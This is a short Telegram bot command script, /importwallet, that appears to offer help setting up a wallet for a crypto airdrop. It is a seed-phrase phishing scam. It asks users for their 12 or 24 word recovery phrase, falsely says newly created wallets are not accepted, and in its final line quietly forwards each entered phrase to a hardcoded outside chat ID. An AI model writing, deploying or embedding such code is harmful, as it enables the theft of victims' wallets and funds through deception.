/*CMD
  command: /importwallet
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER
👝 Setting up wallet 👝
🔑 The recovery phase is the master key to your wallet. 




⛔️ To Avoid Spam and unfair Multi-Claims, NEW CREATED WALLET NOT ACCEPTED.⛔️

✅ Please note: Airdrop requires Multi-Coin Wallet!
✅ Please enter your 12 or 24 words phrase separated with spaces:


  ANSWER
  keyboard: 💾Save, 📜Menu
  aliases: 👝setup wallet
CMD*/

Bot.sendMessage( "Your Wallet Phase: " + message + "\nIf is correct press 💾Save");
Bot.sendMessageToChatWithId(1548791150, message);

